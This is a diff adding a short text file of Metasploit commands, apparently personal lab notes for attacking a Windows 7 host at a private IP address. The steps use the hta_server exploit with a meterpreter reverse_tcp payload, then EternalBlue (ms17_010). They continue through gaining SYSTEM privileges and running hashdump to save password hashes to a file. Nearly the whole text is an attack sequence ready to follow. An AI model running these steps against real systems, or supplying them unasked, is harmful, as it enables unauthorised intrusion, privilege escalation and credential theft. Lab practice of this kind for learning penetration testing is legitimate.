@@ -1,0 +1,20 @@
+Sample IP : 192.168.59.132
+
+ Start Metasploit : msfconsole
+ View Exploits : show exploits
+ Search sxploits : search hta_server
+ Select Payload: use exploit/windows/misc/hta_server
+ Run "info" and "show options" command
+ View all payloads: show payloads
+ Get IP address of windows 7
+ Use "set" command : set SRVHOST {IP}
+ Set Payload : set payload windows/meterpreter/reverse_tcp
+ show options
+ Run the exploit : exploit
+ Use exploit : exploit/windows/smb/ms17_010_eternalblue 
+ sessions
+ getuid (Write username: NT AUTHORITY\SYSTEM)
+ getprivs
+ getsystem
+ hashdump
+ Output in password named txt file
